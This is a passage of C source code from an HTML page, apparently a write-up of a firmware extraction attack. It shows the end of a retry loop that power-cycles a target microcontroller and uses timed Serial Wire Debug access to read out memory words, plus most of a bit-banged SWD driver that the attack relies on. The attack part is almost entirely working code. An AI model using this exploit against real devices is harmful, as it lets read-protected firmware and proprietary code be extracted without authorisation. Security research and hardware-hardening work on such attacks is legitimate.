    <span class="k">static</span> <span class="kt">uint16_t</span> <span class="n">delayJitter</span> <span class="o">=</span> <span class="n">DELAY_JITTER_MS_MIN</span><span class="p">;</span>

    <span class="kt">uint32_t</span> <span class="n">extractedData</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">idCode</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>

    <span class="cm">/* Limit the maximum number of attempts PER WORD */</span>
    <span class="kt">uint32_t</span> <span class="n">numReadAttempts</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>

    <span class="cm">/* try up to MAX_READ_TRIES times until we have the data */</span>
    <span class="k">do</span> <span class="p">{</span>
        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">LED1_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>

        <span class="n">targetPowerOn</span><span class="p">();</span>

        <span class="n">delay</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>

        <span class="n">dbgStatus</span> <span class="o">=</span> <span class="n">swdInit</span><span class="p">(</span><span class="o">&amp;</span><span class="n">idCode</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">dbgStatus</span> <span class="o">==</span> <span class="n">swdStatusOk</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">dbgStatus</span> <span class="o">=</span> <span class="n">swdEnableDebugIF</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">dbgStatus</span> <span class="o">==</span> <span class="n">swdStatusOk</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">dbgStatus</span> <span class="o">=</span> <span class="n">swdSetAP32BitMode</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">dbgStatus</span> <span class="o">==</span> <span class="n">swdStatusOk</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">dbgStatus</span> <span class="o">=</span> <span class="n">swdSelectAHBAP</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">dbgStatus</span> <span class="o">==</span> <span class="n">swdStatusOk</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">targetRestore</span><span class="p">();</span>
            <span class="n">delay</span><span class="p">(</span><span class="n">delayJitter</span><span class="p">);</span>

            <span class="cm">/* The magic happens here! */</span>
            <span class="n">dbgStatus</span> <span class="o">=</span> <span class="n">swdReadAHBAddr</span><span class="p">((</span><span class="n">address</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFCu</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">extractedData</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="n">targetReset</span><span class="p">();</span>

        <span class="cm">/* Check whether readout was successful. Only if swdStatusOK is returned, extractedData is valid */</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">dbgStatus</span> <span class="o">==</span> <span class="n">swdStatusOk</span><span class="p">)</span> <span class="p">{</span>
            <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">extractedData</span><span class="p">;</span>
            <span class="n">digitalWrite</span><span class="p">(</span><span class="n">LED1_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="o">++</span><span class="n">numReadAttempts</span><span class="p">;</span>

            <span class="n">delayJitter</span> <span class="o">+=</span> <span class="n">DELAY_JITTER_MS_INCREMENT</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">delayJitter</span> <span class="o">&gt;=</span> <span class="n">DELAY_JITTER_MS_MAX</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">delayJitter</span> <span class="o">=</span> <span class="n">DELAY_JITTER_MS_MIN</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="n">targetPowerOff</span><span class="p">();</span>

        <span class="n">delay</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
        <span class="n">targetRestore</span><span class="p">();</span>
        <span class="n">delay</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
        <span class="n">targetReset</span><span class="p">();</span>
        <span class="n">delay</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>

    <span class="p">}</span> <span class="k">while</span> <span class="p">((</span><span class="n">dbgStatus</span> <span class="o">!=</span> <span class="n">swdStatusOk</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">numReadAttempts</span> <span class="o">&lt;</span> <span class="p">(</span><span class="n">MAX_READ_ATTEMPTS</span><span class="p">)));</span>

    <span class="k">return</span> <span class="n">dbgStatus</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="swdc">swd.c</h3>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
 * Copyright (C) 2017 Obermaier Johannes
 * Copyright (C) 2022 Lucas Teske
 *
 * This Source Code Form is subject to the terms of the MIT License.
 * If a copy of the MIT License was not distributed with this file,
 * you can obtain one at https://opensource.org/licenses/MIT
 */</span>

<span class="cp">#include</span> <span class="cpf">"swd.h"</span><span class="cp">
</span>
<span class="cp">#include</span> <span class="cpf">"main.h"</span><span class="cp">
</span>
<span class="cp">#define MWAIT __asm__ __volatile__( \
    ".syntax unified 		\n"          \
    "	movs r0, #0x20 		\n"          \
    "1: 	subs r0, #1 		\n"          \
    "	bne 1b 			\n"                 \
    ".syntax divided"               \
    :                               \
    :                               \
    : "cc", "r0")
</span>
<span class="cp">#define N_READ_TURN (3u)
</span>
<span class="k">static</span> <span class="kt">uint8_t</span> <span class="nf">swdParity</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="k">const</span><span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">len</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDatasend</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="k">const</span><span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">len</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDataIdle</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDataPP</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdTurnaround</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdReset</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDataRead</span><span class="p">(</span><span class="kt">uint8_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">len</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdBuildHeader</span><span class="p">(</span><span class="n">swdAccessDirection_t</span> <span class="k">const</span> <span class="n">adir</span><span class="p">,</span> <span class="n">swdPortSelect_t</span> <span class="k">const</span> <span class="n">portSel</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">A32</span><span class="p">,</span> <span class="kt">uint8_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">header</span><span class="p">);</span>
<span class="k">static</span> <span class="n">swdStatus_t</span> <span class="nf">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelect_t</span> <span class="k">const</span> <span class="n">portSel</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">A32</span><span class="p">,</span> <span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">);</span>
<span class="k">static</span> <span class="n">swdStatus_t</span> <span class="nf">swdWritePacket</span><span class="p">(</span><span class="n">swdPortSelect_t</span> <span class="k">const</span> <span class="n">portSel</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">A32</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="k">const</span> <span class="n">data</span><span class="p">);</span>
<span class="k">static</span> <span class="n">swdStatus_t</span> <span class="nf">swdReadAP0</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">);</span>

<span class="k">static</span> <span class="kt">uint8_t</span> <span class="nf">swdParity</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="k">const</span><span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">uint8_t</span> <span class="n">par</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="n">cdata</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="n">i</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">((</span><span class="n">i</span> <span class="o">&amp;</span> <span class="mh">0x07u</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0u</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">cdata</span> <span class="o">=</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span>
            <span class="o">++</span><span class="n">data</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">par</span> <span class="o">^=</span> <span class="p">(</span><span class="n">cdata</span> <span class="o">&amp;</span> <span class="mh">0x01u</span><span class="p">);</span>
        <span class="n">cdata</span> <span class="o">&gt;&gt;=</span> <span class="mi">1u</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">par</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDatasend</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="k">const</span><span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">uint8_t</span> <span class="n">cdata</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="n">i</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">((</span><span class="n">i</span> <span class="o">&amp;</span> <span class="mh">0x07u</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x00u</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">cdata</span> <span class="o">=</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span>
            <span class="o">++</span><span class="n">data</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">((</span><span class="n">cdata</span> <span class="o">&amp;</span> <span class="mh">0x01u</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x01u</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="n">MWAIT</span><span class="p">;</span>

        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
        <span class="n">MWAIT</span><span class="p">;</span>
        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
        <span class="n">cdata</span> <span class="o">&gt;&gt;=</span> <span class="mi">1u</span><span class="p">;</span>
        <span class="n">MWAIT</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDataIdle</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="n">MWAIT</span><span class="p">;</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">INPUT</span><span class="p">);</span>
    <span class="n">MWAIT</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDataPP</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">MWAIT</span><span class="p">;</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
    <span class="n">MWAIT</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdTurnaround</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="n">MWAIT</span><span class="p">;</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
    <span class="n">MWAIT</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDataRead</span><span class="p">(</span><span class="kt">uint8_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">uint8_t</span> <span class="n">i</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="n">cdata</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>

    <span class="n">MWAIT</span><span class="p">;</span>
    <span class="n">swdDataIdle</span><span class="p">();</span>
    <span class="n">MWAIT</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">cdata</span> <span class="o">&gt;&gt;=</span> <span class="mi">1u</span><span class="p">;</span>
        <span class="n">cdata</span> <span class="o">|=</span> <span class="n">digitalRead</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">)</span> <span class="o">?</span> <span class="mh">0x80u</span> <span class="o">:</span> <span class="mh">0x00u</span><span class="p">;</span>
        <span class="n">data</span><span class="p">[(((</span><span class="n">len</span> <span class="o">+</span> <span class="mi">7u</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">3u</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">i</span> <span class="o">&gt;&gt;</span> <span class="mi">3u</span><span class="p">))</span> <span class="o">-</span> <span class="mi">1u</span><span class="p">]</span> <span class="o">=</span> <span class="n">cdata</span><span class="p">;</span>

        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
        <span class="n">MWAIT</span><span class="p">;</span>
        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
        <span class="n">MWAIT</span><span class="p">;</span>

        <span class="cm">/* clear buffer after reading 8 bytes */</span>
        <span class="k">if</span> <span class="p">((</span><span class="n">i</span> <span class="o">&amp;</span> <span class="mh">0x07u</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x07u</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">cdata</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdReset</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">uint8_t</span> <span class="n">i</span><span class="p">;</span>

    <span class="n">MWAIT</span><span class="p">;</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="n">MWAIT</span><span class="p">;</span>

    <span class="cm">/* 50 clk+x */</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mi">50u</span> <span class="o">+</span> <span class="mi">10u</span><span class="p">);</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
        <span class="n">MWAIT</span><span class="p">;</span>
        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
        <span class="n">MWAIT</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">3u</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
        <span class="n">MWAIT</span><span class="p">;</span>
        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
        <span class="n">MWAIT</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdBuildHeader</span><span class="p">(</span><span class="n">swdAccessDirection_t</span> <span class="k">const</span> <span class="n">adir</span><span class="p">,</span> <span class="n">swdPortSelect_t</span> <span class="k">const</span> <span class="n">portSel</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">A32</span><span class="p">,</span> <span class="kt">uint8_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">header</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">portSel</span> <span class="o">==</span> <span class="n">swdPortSelectAP</span><span class="p">)</span> <span class="p">{</span>
        <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="mh">0x02u</span><span class="p">;</span> <span class="cm">/* Access AP */</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">adir</span> <span class="o">==</span> <span class="n">swdAccessDirectionRead</span><span class="p">)</span> <span class="p">{</span>
        <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="mh">0x04u</span><span class="p">;</span> <span class="cm">/* read access */</span>
    <span class="p">}</span>

    <span class="k">switch</span> <span class="p">(</span><span class="n">A32</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">case</span> <span class="mh">0x01u</span><span class="p">:</span>
            <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="mh">0x08u</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>

        <span class="k">case</span> <span class="mh">0x02u</span><span class="p">:</span>
            <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="mh">0x10u</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>

        <span class="k">case</span> <span class="mh">0x03u</span><span class="p">:</span>
            <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="mh">0x18u</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>

        <span class="nl">default:</span>
        <span class="k">case</span> <span class="mh">0x00u</span><span class="p">:</span>

            <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="n">swdParity</span><span class="p">(</span><span class="n">header</span><span class="p">,</span> <span class="mi">7u</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">5u</span><span class="p">;</span>
    <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="mh">0x01u</span><span class="p">;</span> <span class="cm">/* startbit */</span>
    <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="mh">0x80u</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="n">swdStatus_t</span> <span class="nf">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelect_t</span> <span class="k">const</span> <span class="n">portSel</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">A32</span><span class="p">,</span> <span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">ret</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="n">header</span> <span class="o">=</span> <span class="mh">0x00u</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="n">rp</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x00u</span><span class="p">};</span>
    <span class="kt">uint8_t</span> <span class="n">resp</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0u</span><span class="p">};</span>
    <span class="kt">uint8_t</span> <span class="n">i</span><span class="p">;</span>

    <span class="n">swdBuildHeader</span><span class="p">(</span><span class="n">swdAccessDirectionRead</span><span class="p">,</span> <span class="n">portSel</span><span class="p">,</span> <span class="n">A32</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">header</span><span class="p">);</span>

    <span class="n">swdDatasend</span><span class="p">(</span><span class="o">&amp;</span><span class="n">header</span><span class="p">,</span> <span class="mi">8u</span><span class="p">);</span>
    <span class="n">swdDataIdle</span><span class="p">();</span>
    <span class="n">swdTurnaround</span><span class="p">();</span>
    <span class="n">swdDataRead</span><span class="p">(</span><span class="n">rp</span><span class="p">,</span> <span class="mi">3u</span><span class="p">);</span>

    <span class="n">swdDataRead</span><span class="p">(</span><span class="n">resp</span><span class="p">,</span> <span class="mi">33u</span><span class="p">);</span>

    <span class="n">swdDataPP</span><span class="p">();</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N_READ_TURN</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">swdTurnaround</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">resp</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">|</span> <span class="p">(</span><span class="n">resp</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">8u</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">resp</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">16u</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">resp</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">24u</span><span class="p">);</span>

    <span class="n">ret</span> <span class="o">=</span> <span class="n">rp</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="n">swdStatus_t</span> <span class="nf">swdWritePacket</span><span class="p">(</span><span class="n">swdPortSelect_t</span> <span class="k">const</span> <span class="n">portSel</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">A32</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="k">const</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">ret</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="n">header</span> <span class="o">=</span> <span class="mh">0x00u</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="n">rp</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x00u</span><span class="p">};</span>
    <span class="kt">uint8_t</span> <span class="n">data1</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0u</span><span class="p">};</span>
    <span class="kt">uint8_t</span> <span class="n">i</span><span class="p">;</span>

    <span class="n">swdBuildHeader</span><span class="p">(</span><span class="n">swdAccessDirectionWrite</span><span class="p">,</span> <span class="n">portSel</span><span class="p">,</span> <span class="n">A32</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">header</span><span class="p">);</span>

    <span class="n">swdDatasend</span><span class="p">(</span><span class="o">&amp;</span><span class="n">header</span><span class="p">,</span> <span class="mi">8u</span><span class="p">);</span>
    <span class="n">MWAIT</span><span class="p">;</span>

    <span class="n">swdDataIdle</span><span class="p">();</span>
    <span class="n">MWAIT</span><span class="p">;</span>

    <span class="n">swdTurnaround</span><span class="p">();</span>

    <span class="n">swdDataRead</span><span class="p">(</span><span class="n">rp</span><span class="p">,</span> <span class="mi">3u</span><span class="p">);</span>

    <span class="n">swdDataIdle</span><span class="p">();</span>

    <span class="n">swdTurnaround</span><span class="p">();</span>
    <span class="n">swdDataPP</span><span class="p">();</span>

    <span class="n">data1</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span> <span class="o">&amp;</span> <span class="mh">0xFFu</span><span class="p">;</span>
    <span class="n">data1</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span> <span class="o">&gt;&gt;</span> <span class="mi">8u</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFu</span><span class="p">;</span>
    <span class="n">data1</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span> <span class="o">&gt;&gt;</span> <span class="mi">16u</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFu</span><span class="p">;</span>
    <span class="n">data1</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span> <span class="o">&gt;&gt;</span> <span class="mi">24u</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFu</span><span class="p">;</span>
    <span class="n">data1</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">swdParity</span><span class="p">(</span><span class="n">data1</span><span class="p">,</span> <span class="mi">8u</span> <span class="o">*</span> <span class="mi">4u</span><span class="p">);</span>

    <span class="n">swdDatasend</span><span class="p">(</span><span class="n">data1</span><span class="p">,</span> <span class="mi">33u</span><span class="p">);</span>

    <span class="n">swdDataPP</span><span class="p">();</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">20u</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">swdTurnaround</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="n">ret</span> <span class="o">=</span> <span class="n">rp</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">swdStatus_t</span> <span class="nf">swdReadIdcode</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">idCode</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">uint32_t</span> <span class="n">ret</span><span class="p">;</span>

    <span class="n">ret</span> <span class="o">=</span> <span class="n">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelectDP</span><span class="p">,</span> <span class="mh">0x00u</span><span class="p">,</span> <span class="n">idCode</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">swdStatus_t</span> <span class="nf">swdSelectAPnBank</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">ap</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">bank</span><span class="p">)</span> <span class="p">{</span>
